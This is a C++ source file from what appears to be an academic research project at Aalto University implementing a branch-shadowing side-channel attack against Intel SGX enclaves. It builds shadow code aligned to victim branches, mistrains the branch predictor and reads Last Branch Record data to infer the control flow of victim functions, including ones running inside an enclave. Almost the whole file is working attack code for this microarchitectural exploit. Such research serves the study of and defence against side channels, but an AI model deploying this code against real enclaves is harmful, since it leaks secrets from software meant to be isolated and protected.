/*
 * Author: Hans Liljestrand, Shohreh Hosseinzadeh
 * Copyright: Secure Systems Group, Aalto University https://ssg.aalto.fi/
 * This code is released under Apache 2.0 license
 */

#include <cstdlib>
#include <emmintrin.h>
#include <shadow/SegEaxAndOneIndir.h>

#include "BranchShadow.h"

#include "mem/Pointers.h"
#include "misc/LbrStats.h"
#include "misc/BpuUtils.h"
#include "shadow/Shadow.h"
#include "shadow/SegEaxWrite.h"
#include "shadow/SegRetq.h"
#include "shadow/SegNop.h"
#include "shadow/SegEaxAndOne.h"
#include "shadow/SegJneEaxZero.h"
#include "shadow/SegJump.h"
#include "shadow/SegSetPosInReg.h"
#include "shadow/SegJumpR13.h"
#include "shadow/SegLongJump.h"
#include "victim.h"

//#define DO_SLEEP_BEFORE_SHADOW
#define DO_MULTIPLE_TRAINING_ROUNDS
//#define TEST_NO_VICTIM

#ifdef TEST_NO_VICTIM
#define run_training(x)
#else /* !TEST_NO_VICTIM */
#ifdef DO_MULTIPLE_TRAINING_ROUNDS
#define run_training(x) {                          \
    for (int i = 0; i < m_training_rounds; i++)    \
        (x);                                       \
    (x);                                           \
}
#else
#define run_training(x) {                          \
        (x);                                       \
}
#endif
#endif /* !TEST_NO_VICTIM */

BranchShadow::BranchShadow()
{
    m_stats = std::make_shared<LbrStats>();
}

std::shared_ptr<BranchShadow> BranchShadow::getInstance() {
    static std::shared_ptr<BranchShadow> singleton = std::make_shared<BranchShadow>();
    return singleton;
}

BranchShadow::~BranchShadow() {
    /* Enclave and LbrReader automatically trigger cleanup on destruction */
}

void BranchShadow::prepare_lbr()
{
    logger->debug("calling new LbrReader()");
    m_lbrReader = std::make_shared<LbrReader>();

    if (m_lbrReader->device_file_exists()) {
        logger->debug("trying to open %s", m_lbrReader->c_str());
        if (!m_lbrReader->open_device())
            abort();
    } else {
        logger->warn("Skipping LBR, cannot find device file %s",
                     m_lbrReader->c_str());
    }
}

void BranchShadow::prepare_enclave() {
    /* Initialize the enclave */
    logger->debug("Creating Enclave object");
    //m_enclave = std::make_shared<Enclave>();
    m_enclave = std::make_shared<Enclave>();
    if (m_enclave_sgx_debug_flag != -1)
        m_enclave->set_debug_flag(m_enclave_sgx_debug_flag);
    logger->debug("Initializing SGX enclave");
    if (!m_enclave->initialize_enclave())
        abort();

    /* Call the enclave to exfiltrate memory addresses */
    logger->debug("Calling Enclave to exifltrate addresses");
    if (!m_enclave->exfiltrate_addresses())
        abort();
}

void BranchShadow::prepare_attack(void *src, void *dst, int shadow_input)
{
    assert(src != nullptr);
    assert(dst != nullptr);
    logger->debug("creating shadow area for %p -> %p", src, dst);
    m_src = src;
    m_dst = dst;
    m_lbr_fd = m_lbrReader->get_fd();

    m_shadow = std::make_shared<Shadow>(lbr_entry_bits, src, dst);

    if (m_enclave != nullptr)
        m_eid = m_enclave->get_eid();

    if (m_use_indirect_targets) {
        m_indirect_shadow_input = Pointers::get_indirect_pointer(static_cast<uintptr_t>(shadow_input));
        m_indirect_target_ptr = Pointers::get_indirect_pointer(0);
    }
}

always_inline
inline uintptr_t BranchShadow::finish_attack(int shadow_retval)
{
    SPDLOG_TRACE(logger, "finishing up");
    LbrReader::dump_lbr_inline(m_lbr_fd);
#ifdef TEST_NO_VICTIM
    logger->warn("Test was run using TEST_NO_VICTIM, expecting no good results!");
#endif

    m_lbrReader->read_lbr();

    logger->debug("done, shadow retval is %d", shadow_retval);


    if (m_dump_lbr)
        m_lbrReader->print_lbr_data(m_src, m_shadow_src);

    if (m_use_indirect_targets) {
        Pointers::free_indirect_pointer(m_indirect_shadow_input);
        Pointers::free_indirect_pointer(m_indirect_target_ptr);
    }

    m_shadow = nullptr;
    m_src = nullptr;
    m_dst = nullptr;

    m_stats->add_from_lbr_data(m_lbrReader->get_data_ptr(), m_shadow_src);
    SPDLOG_TRACE(logger, "setting m_shadow_src to %0x016lx", m_shadow_src);
    return reinterpret_cast<uintptr_t>(m_shadow_src);
}

void *BranchShadow::setup_jmp_shadow()
{
    assert(m_shadow != nullptr);

    auto if_seg  = SegEaxWrite::make(nullptr, 1);
    auto else_seg  = SegEaxWrite::make(m_dst, 2);
    auto end_if_seg   = SegRetq::make(nullptr, 120);
    auto end_else_seg   = SegRetq::make(nullptr, 120);
    auto src_seg = m_use_indirect_targets ?
                   SegJumpR13::make(m_src) :
                   SegJump::make(m_src, else_seg);
    auto entry_seg = m_use_indirect_targets ?
                     SegSetPosInReg::make(nullptr, else_seg, m_indirect_target_ptr, 13) :
                     SegNop::make();

    logger->debug("Setting up shadow from %p to %p", m_src, m_dst);

    if (m_src < m_dst) {
        logger->debug("Constructing forward jmp shadow");
        /* We have a forward jump, i.e., a typical if.
         *
         * entry:
         *          test
         *          jmp *%[else]            // aligned to src
         *          mov %eax, 2
         *          jmp %[end_if]
         * else:
         *          mov %eax, 1             // aligned to dst
         *          jmp %[end_else]
         * end_if:
         *          nops...
         *          retq
         * end_else:
         *          lots...
         *          retq
         * */

        // entry
        m_shadow->add_entry(entry_seg);
        m_shadow->add_segment(src_seg);
        // if
        m_shadow->add_segment(if_seg);
        m_shadow->add_segment(SegLongJump::make(nullptr, end_if_seg));
        // else
        m_shadow->add_segment(else_seg);
        m_shadow->add_segment(SegLongJump::make(nullptr, end_else_seg));
        // end
        m_shadow->add_segment(end_if_seg);
        m_shadow->add_segment(end_else_seg);
        m_shadow->finalize();
    } else {
        logger->debug("Constructing backward jmp shadow");
        /* We have a backward jump (maybe retpoline)
         *
         * if:
         *          mov %eax, 2
         *          jmp %[end_if]
         * else:
         *          mov %eax, 1             // aligned to dst
         *          jmp %[end_else]
         * entry:
         *          test
         *          jmp *%[else]            // aligned to src
         * end_if:
         *          nops...
         *          retq
         * end_else:
         *          lots...
         *          retq
         */


        // if
        m_shadow->add_segment(if_seg);
        m_shadow->add_segment(SegLongJump::make(nullptr, end_if_seg));
        // else
        m_shadow->add_segment(else_seg);
        m_shadow->add_segment(SegLongJump::make(nullptr, end_else_seg));
        // entry
        m_shadow->add_entry(entry_seg);
        m_shadow->add_segment(src_seg);
        // end
        m_shadow->add_segment(end_if_seg);
        m_shadow->add_segment(end_else_seg);
        m_shadow->finalize();
    }

    if (m_use_indirect_targets) {
        Pointers::flush_indirect_pointer(m_indirect_target_ptr);
        Pointers::flush_indirect_pointer(m_indirect_shadow_input);
    }

    m_shadow_src = src_seg->get_pos();


    auto entry_ptr = m_shadow->get_entry_ptr();
    logger->info("%s: entry at %p, shadowing (ind%d) %p -> %p", __FUNCTION__, entry_ptr,
                 m_use_indirect_targets ? 1 : 0, m_src, m_shadow_src);
    return entry_ptr;
}

void *BranchShadow::setup_jmp_shadow_rev()
{
    assert(m_shadow != nullptr);

    auto if_seg  = SegEaxWrite::make(m_dst, 1);
    auto else_seg  = SegEaxWrite::make(nullptr, 2);
    auto end_if_seg   = SegRetq::make(nullptr, 120);
    auto end_else_seg   = SegRetq::make(nullptr, 120);
    auto src_seg = m_use_indirect_targets ?
                   SegJumpR13::make(m_src) :
                   SegJump::make(m_src, if_seg);
    auto entry_seg = m_use_indirect_targets ?
                     SegSetPosInReg::make(nullptr, if_seg, m_indirect_target_ptr, 13) :
                     SegNop::make();

    logger->debug("Setting up shadow from %p to %p", m_src, m_dst);

    if (m_src < m_dst) {
        logger->debug("Constructing forward jmp shadow");
        /* We have a forward jump, i.e., a typical if.
         *
         * entry:
         *          test
         *          jmp *%[else]            // aligned to src
         *          mov %eax, 2
         * else:
         *          mov %eax, 1             // aligned to dst
         * end:
         *          retq
         */

        // entry
        m_shadow->add_entry(entry_seg);
        m_shadow->add_segment(src_seg);
        // if
        m_shadow->add_segment(if_seg);
        m_shadow->add_segment(SegLongJump::make(nullptr, end_if_seg));
        // else
        m_shadow->add_segment(else_seg);
        m_shadow->add_segment(SegLongJump::make(nullptr, end_else_seg));
        // end
        m_shadow->add_segment(end_if_seg);
        m_shadow->add_segment(end_else_seg);
        m_shadow->finalize();
    } else {
        logger->debug("Constructing backward jmp shadow");
        /* We have a backward jump (maybe retpoline)
         *
         * if:
         *          mov %eax, 2
         *          jmp %[if_spend_time]
         *
         * else:
         *          mov %eax, 1             // aligned to dst
         *          jmp %[exit]
         *
         * entry:
         *          test
         *          jmp *%[else]            // aligned to src
         *
         * end:
         *          retq
         *
         * if_spend_time:
         *          lots of nops
         *          jmp %[end]
         *
         * else_spend_time:
         *          lots of nops
         *          jmp %[end]
         */


        // if
        m_shadow->add_segment(if_seg);
        m_shadow->add_segment(SegLongJump::make(nullptr, end_if_seg));
        // else
        m_shadow->add_segment(else_seg);
        m_shadow->add_segment(SegLongJump::make(nullptr, end_else_seg));
        // entry
        m_shadow->add_entry(entry_seg);
        m_shadow->add_segment(src_seg);
        // end
        m_shadow->add_segment(end_if_seg);
        m_shadow->add_segment(end_else_seg);
        m_shadow->finalize();
    }

    if (m_use_indirect_targets) {
        Pointers::flush_indirect_pointer(m_indirect_target_ptr);
        Pointers::flush_indirect_pointer(m_indirect_shadow_input);
    }

    m_shadow_src = src_seg->get_pos();


    auto entry_ptr = m_shadow->get_entry_ptr();
    logger->info("%s: entry at %p, shadowing (ind%d) %p -> %p", __FUNCTION__, entry_ptr,
                 m_use_indirect_targets ? 1 : 0, m_src, m_shadow_src);
    return entry_ptr;
}

void *BranchShadow::setup_jne_shadow()
{
    assert(m_shadow != nullptr);

    auto if_seg  = SegEaxWrite::make(nullptr, 1);
    auto else_seg  = SegEaxWrite::make(m_dst, 2);
    auto end_if_seg   = SegRetq::make(nullptr, 120);
    auto end_else_seg   = SegRetq::make(nullptr, 120);

    //auto entry_seg = SegNop::make();

    /* Cannot use indirect jumps with jne :/
     *
     * BUT, we can use indirect input for the condtional jump (JNE).
     */

    auto entry_seg = m_use_indirect_targets
                     ? SegSetPosInReg::make(nullptr, nullptr, m_indirect_shadow_input, 14)
                     : SegNop::make();
    auto pretest_seg = m_use_indirect_targets
                       ? SegEaxAndOneIndir::make()
                       : SegEaxAndOne::make();
    auto src_seg = SegJneEaxZero::make(m_src, else_seg);

    if (m_src < m_dst) {
        logger->debug("Constructing regular forward JNE shadow");
        /* We have a forward jump, i.e., a typical if.
         *
         * entry:
         *          prep...
         *          jmp *%[src]
         * src:
         *          jne *%[else]            // aligned to src
         * if:
         *          mov %eax, 2
         *          jmp *%[end_if]
         * else:
         *          mov %eax, 1             // aligned to dst
         *          jmp *%[end_else]
         * end_if:
         *          nops...
         *          retq
         * end_else:
         *          nops...
         *          retq
         */

        // entry
        m_shadow->add_entry(entry_seg);
        m_shadow->add_segment(pretest_seg);
        m_shadow->add_segment(SegLongJump::make(nullptr, src_seg));
        // src
        m_shadow->add_segment(src_seg);
        // if
        m_shadow->add_segment(if_seg);
        m_shadow->add_segment(SegJump::make(nullptr, end_if_seg));
        // else
        m_shadow->add_segment(else_seg);
        m_shadow->add_segment(SegJump::make(nullptr, end_else_seg));
        // end_if
        m_shadow->add_segment(end_if_seg);
        // end_else
        m_shadow->add_segment(end_else_seg);

        m_shadow->finalize();
    } else {
        logger->debug("Constructing backward JNE shadow");
        /* We have a backward jump (maybe retpoline)
         *
         * entry:
         *          prep...
         *          jmp *%[src]
         * if:
         *          mov %eax, 2
         *          jmp *%[end_if]
         *
         * else:
         *          mov %eax, 1             // aligned to dst
         *          jmp *%[end_else]
         *
         * src:
         *          test
         *          jne *%[else]            // aligned to src
         *          jmp *%[if]
         * end_if:
         *          nops...
         *          retq
         * end_else:
         *          nops...
         *          retq
         *
         */
        // entry
        m_shadow->add_entry(entry_seg);
        m_shadow->add_segment(pretest_seg);
        m_shadow->add_segment(SegLongJump::make(nullptr, src_seg));

        // if
        m_shadow->add_segment(if_seg);
        m_shadow->add_segment(SegLongJump::make(nullptr, end_if_seg));
        // else
        m_shadow->add_segment(else_seg);
        m_shadow->add_segment(SegLongJump::make(nullptr, end_else_seg));
        // entry
        m_shadow->add_segment(src_seg);
        m_shadow->add_segment(SegJump::make(nullptr, if_seg));
        // end_if
        m_shadow->add_segment(end_if_seg);
        // end_else
        m_shadow->add_segment(end_else_seg);

        m_shadow->finalize();
    }

    m_shadow_src = Pointers::add_offset(src_seg->get_pos(), SegJneEaxZero::jne_offset);

    if (m_use_indirect_targets) {
        Pointers::flush_indirect_pointer(m_indirect_target_ptr);
        Pointers::flush_indirect_pointer(m_indirect_shadow_input);
    }

    auto entry_ptr = m_shadow->get_entry_ptr();
    logger->info("%s: entry at %p, shadowing %p -> %p", __FUNCTION__, entry_ptr, m_src, m_shadow_src);
    return entry_ptr;
}

uint64_t BranchShadow::t1_run_jne(int victim_input, int shadow_input)
{
    logger->info("%s(%d, %d)", __FUNCTION__, victim_input, shadow_input);

    /* Do common preparation for attack */
    prepare_attack(get_victim_jne_src(), get_victim_jne_dst(), shadow_input);
    void *entry = setup_jne_shadow();

    assert(Shadow::is_jne(m_shadow->get_aligned_ptr(m_src)) && "expecting a jne at aligned src address");

    /* Mess up the BPU */
    SPDLOG_TRACE(logger, "mess_btb");
    BpuUtils::mess_btb(m_shadow->get_vic_src());

    /* Run the victim (once or several times depending on DO_MULTIPLE_TRAINING_ROUNDS) */
    SPDLOG_TRACE(logger, "running victim");
    run_training(victim_jne(victim_input));

    /* Run the shadow */
    SPDLOG_TRACE(logger, "running shadow");
    auto retval = Shadow::execute_ptr(entry, shadow_input);

    return finish_attack(retval);
}

uint64_t BranchShadow::t9_run_jne_jmp(int victim_input, int shadow_input)
{
    /* Try shadowing a jne with a jmp .
     * Directional speculation not needed, so if this produces misses, they should be due to
     * mispredicted branch target.
     */
    logger->info("%s(%d, %d)", __FUNCTION__, victim_input, shadow_input);

    /* Do common preparation for attack */
    prepare_attack(get_victim_jne_src(), get_victim_jne_dst(), shadow_input);
    void *entry = setup_jmp_shadow();
    BpuUtils::mess_btb(m_shadow->get_vic_src());
    run_training(victim_jne(victim_input));
    SPDLOG_TRACE(logger, "running shadow");
    auto retval = Shadow::execute_ptr(entry, shadow_input);

    return finish_attack(retval);
}

uint64_t BranchShadow::t2_run_ret(int victim_input, int shadow_input) {
    /* This is a basic retpoline shadowing attempt using jne.
     * The target should be predictable based on return, provided that it actually gets stored
     * in the LBR when a retq is executed.
     * The direction could perhaps be predicted also?
     */
    logger->info("%s(%d, %d)", __FUNCTION__, victim_input, shadow_input);
    prepare_attack(get_victim_ret_retpoline(), get_victim_ret_else(), shadow_input);
    void *entry = setup_jne_shadow();
    BpuUtils::mess_btb(m_shadow->get_vic_src());
    SPDLOG_TRACE(logger, "running victim");
    run_training(victim_ret(victim_input));
    SPDLOG_TRACE(logger, "running shadow");
    auto retval = Shadow::execute_ptr(entry, shadow_input);
    return finish_attack(retval);
}

uint64_t BranchShadow::t10_run_ret_reverse_shadow_input(int victim_input, int shadow_input) {
    /* This is a basic retpoline shadowing attempt using jne.
     * The target should be predictable based on return, provided that it actually gets stored
     * in the LBR when a retq is executed.
     * The direction could perhaps be predicted also?
     */
    logger->info("%s(%d, %d)", __FUNCTION__, victim_input, shadow_input);
    shadow_input += 1; // reverse the odd/even quality of shadow input
    prepare_attack(get_victim_ret_retpoline(), get_victim_ret_else(), shadow_input);
    void *entry = setup_jne_shadow();
    BpuUtils::mess_btb(m_shadow->get_vic_src());
    SPDLOG_TRACE(logger, "running victim");
    run_training(victim_ret(victim_input));
    SPDLOG_TRACE(logger, "running shadow");
    auto retval = Shadow::execute_ptr(entry, shadow_input);
    return finish_attack(retval);
}

uint64_t BranchShadow::t5_run_ret2(int victim_input, int shadow_input)
{
    /* Try to shadow ret by causing a stored entry to disappear, i.e.,:
     * shadow() // -> trains predictor to jmp to X
     * victim() // -> trains predictor to ret to non-X
     * shadow() // -> check mispredict?
     *
     * This would happen if the victim retq instruction would overwrite the LBR entry at
     * the same location.
     *
     * If not, we would expect to see that 100% hits.
     * If yes, this could potentially be used to detect executed branches.
     */
    logger->info("%s(%d, %d)", __FUNCTION__, victim_input, shadow_input);
    prepare_attack(get_victim_ret_retpoline(), // create jump to elsewhere than victim retpoline
                   Pointers::add_offset(get_victim_ret_else(), 2), shadow_input);
    void *entry = setup_jne_shadow();
    BpuUtils::mess_btb(m_shadow->get_vic_src());
    SPDLOG_TRACE(logger, "running shadow to train predictor");
    run_training(Shadow::execute_ptr(entry, shadow_input));
    SPDLOG_TRACE(logger, "running victim to mess with predictor");
    victim_ret(victim_input);
    SPDLOG_TRACE(logger, "running shadow again to check changes");
    auto retval = Shadow::execute_ptr(entry, shadow_input);
    return finish_attack(retval);
}

uint64_t BranchShadow::t6_run_ret2_check(int victim_input, int shadow_input)
{
    /* This just test whether the assumption sof t5_run_ret2 are even expected to hold. If that is the case
     * we should see only hits when running this test.
     * shadow() // -> trains predictor to jmp to X
     * SKIPPED: victim() // -> trains predictor to ret to non-X
     * shadow() // -> check mispredict?
     *
     * If we get significantly less thatn 100% hits, then the above assumptions do not hold.
     */
    logger->info("%s(%d, %d)", __FUNCTION__, victim_input, shadow_input);
    prepare_attack(get_victim_ret_retpoline(), // create jump to elsewhere than victim retpoline
                   Pointers::add_offset(get_victim_ret_else(), 2), shadow_input);
    void *entry = setup_jne_shadow();
    BpuUtils::mess_btb(m_shadow->get_vic_src());
    SPDLOG_TRACE(logger, "running shadow to train predictor");
    run_training(Shadow::execute_ptr(entry, shadow_input));
    SPDLOG_TRACE(logger, "skipping training");
    //victim_ret(victim_input); /* NOTE: this is a sanity check, so we don't run the victim at all!
    SPDLOG_TRACE(logger, "running shadow again to check changes");
    auto retval = Shadow::execute_ptr(entry, shadow_input);
    return finish_attack(retval);
}

uint64_t BranchShadow::t7_run_ret_jmp(int victim_input, int shadow_input)
{
    /* Attempt to shadow using unconditional jmp */
    logger->info("%s(%d, %d)", __FUNCTION__, victim_input, shadow_input);
    prepare_attack(get_victim_ret_retpoline(), get_victim_ret_else(), shadow_input);
    void *entry = setup_jmp_shadow();
    BpuUtils::mess_btb(m_shadow->get_vic_src());
    SPDLOG_TRACE(logger, "running shadow to train predictor");
    run_training(Shadow::execute_ptr(entry, shadow_input));
    SPDLOG_TRACE(logger, "running victim to mess with predictor");
    victim_ret(victim_input);
    SPDLOG_TRACE(logger, "running shadow again to check changes");
    auto retval = Shadow::execute_ptr(entry, shadow_input);
    return finish_attack(retval);
}

uint64_t BranchShadow::t12_run_enc_ret_jmp(int victim_input, int shadow_input)
{
    /* Attempt to shadow using unconditional jmp */
    logger->info("%s(%d, %d)", __FUNCTION__, victim_input, shadow_input);
    prepare_attack(get_victim_ret_retpoline(), get_victim_ret_else(), shadow_input);
    void *entry = setup_jmp_shadow();
    BpuUtils::mess_btb(m_shadow->get_vic_src());
    SPDLOG_TRACE(logger, "running victim to train predictor");
    run_training(ecall_victim_ret(m_eid, victim_input));
    SPDLOG_TRACE(logger, "running shadow");
    auto retval = Shadow::execute_ptr(entry, shadow_input);
    return finish_attack(retval);
}

uint64_t BranchShadow::t11_run_ret_jmp(int victim_input, int shadow_input)
{
    /* Attempt to shadow using unconditional jmp */
    logger->info("%s(%d, %d)", __FUNCTION__, victim_input, shadow_input);
    prepare_attack(get_victim_ret_retpoline(), get_victim_ret_if(), shadow_input);
    void *entry = setup_jmp_shadow_rev();
    BpuUtils::mess_btb(m_shadow->get_vic_src());
    SPDLOG_TRACE(logger, "running shadow to train predictor");
    run_training(Shadow::execute_ptr(entry, shadow_input));
    SPDLOG_TRACE(logger, "running victim to mess with predictor");
    victim_ret(victim_input);
    SPDLOG_TRACE(logger, "running shadow again to check changes");
    auto retval = Shadow::execute_ptr(entry, shadow_input);
    return finish_attack(retval);
}

uint64_t BranchShadow::t8_run_ret_jmp_to_other(int victim_input, int shadow_input)
{
    /* Attempt to shadow using unconditional jmp to other location */
    logger->info("%s(%d, %d)", __FUNCTION__, victim_input, shadow_input);
    prepare_attack(get_victim_ret_retpoline(), // create jump to elsewhere than victim retpoline
                   Pointers::add_offset(get_victim_ret_else(), 2), shadow_input);
    void *entry = setup_jmp_shadow();
    BpuUtils::mess_btb(m_shadow->get_vic_src());
    SPDLOG_TRACE(logger, "running shadow to train predictor");
    run_training(Shadow::execute_ptr(entry, shadow_input));
    SPDLOG_TRACE(logger, "running victim to mess with predictor");
    victim_ret(victim_input);
    SPDLOG_TRACE(logger, "running shadow again to check changes");
    auto retval = Shadow::execute_ptr(entry, shadow_input);
    return finish_attack(retval);
}

uint64_t BranchShadow::t3_run_enc_jne(int victim_input, int shadow_input)
{
    logger->info("%s(%d, %d)", __FUNCTION__, victim_input, shadow_input);
    prepare_attack(get_victim_enc_jne_src(), get_victim_enc_jne_dst(), shadow_input);
    void *entry = setup_jne_shadow();
    BpuUtils::mess_btb(m_shadow->get_vic_src());
    run_training(ecall_victim_jne(m_eid, victim_input));
    auto retval = Shadow::execute_ptr(entry, shadow_input);
    return finish_attack(retval);
}

uint64_t BranchShadow::t4_run_enc_ret(int victim_input, int shadow_input)
{
    logger->info("%s(%d, %d)", __FUNCTION__, victim_input, shadow_input);
    prepare_attack(get_victim_enc_ret_ret(), get_victim_enc_ret_else(), shadow_input);
    void *entry = setup_jne_shadow();
    BpuUtils::mess_btb(m_shadow->get_vic_src());
    run_training(ecall_victim_ret(m_eid, victim_input));
    auto retval = Shadow::execute_ptr(entry, shadow_input);
    return finish_attack(retval);
}

uint64_t BranchShadow::t13_run_enc_ret(int victim_input, int shadow_input)
{
    logger->info("%s(%d, %d)", __FUNCTION__, victim_input, shadow_input);
    prepare_attack(get_victim_enc_ret_ret(), get_victim_enc_ret_else(), shadow_input);
    void *entry = setup_jmp_shadow();
    BpuUtils::mess_btb(m_shadow->get_vic_src());
    run_training(ecall_victim_ret(m_eid, victim_input));
    auto retval = Shadow::execute_ptr(entry, shadow_input);
    return finish_attack(retval);
}

void BranchShadow::print_config()
{
    uintptr_t ptr_victim_jne = reinterpret_cast<uintptr_t>(&victim_jne);
    uintptr_t ptr_victim_ret = reinterpret_cast<uintptr_t>(&victim_ret);
    logger->debug("m_training_rounds:  %d", m_training_rounds);
    logger->debug("victim untrusted jne func  0x%lx", ptr_victim_jne);
    logger->debug("victim untrusted jne src   %p", get_victim_jne_src());
    logger->debug("victim untrusted jne dst   %p", get_victim_jne_dst());
    logger->debug("victim untrusted ret func  0x%lx", ptr_victim_ret);
    logger->debug("victim untrusted ret ret   %p", get_victim_ret_retpoline());
    logger->debug("victim untrusted ret if    %p", get_victim_ret_if());
    logger->debug("victim untrusted ret else  %p", get_victim_ret_else());
    logger->debug("victim ENCLAVE   jne src   %p", get_victim_enc_jne_src());
    logger->debug("victim ENCLAVE   jne dst   %p", get_victim_enc_jne_dst());
}

bool BranchShadow::sanity_check_victims()
{
    logger->trace("%s: checking victim functions", __FUNCTION__);

    logger->debug("testing victim_jne");
    assert(victim_jne(0) == 1);
    assert(victim_jne(1) == 2);
    assert(victim_jne(2) == 1);
    assert(victim_jne(3) == 2);
    logger->debug("testing victim_ret");
    assert(victim_ret(0) == 1);
    assert(victim_ret(1) == 2);
    assert(victim_ret(2) == 1);
    assert(victim_ret(3) == 2);

    if (m_enclave != nullptr) {
        logger->debug("testing enclave victim_jne 0");
        assert(m_enclave->test_victim_jne(0) == 1);
        logger->debug("testing enclave victim_jne 1");
        assert(m_enclave->test_victim_jne(1) == 2);
        logger->debug("testing enclave victim_jne 2");
        assert(m_enclave->test_victim_jne(2) == 1);
        logger->debug("testing enclave victim_jne 3");
        assert(m_enclave->test_victim_jne(3) == 2);
        logger->debug("testing enclave victim_ret 0");
        assert(m_enclave->test_victim_ret(0) == 1);
        logger->debug("testing enclave victim_ret 1");
        assert(m_enclave->test_victim_ret(1) == 2);
        logger->debug("testing enclave victim_ret 2");
        assert(m_enclave->test_victim_ret(2) == 1);
        logger->debug("testing enclave victim_ret 3");
        assert(m_enclave->test_victim_ret(3) == 2);
        logger->debug("testing enclave victim_ret 4");
    } else {
        logger->warn("Enclave not available, skipping in-enclave tests");
    }

    logger->debug("%s: sanity-checks okay", __FUNCTION__);
    return true;
}


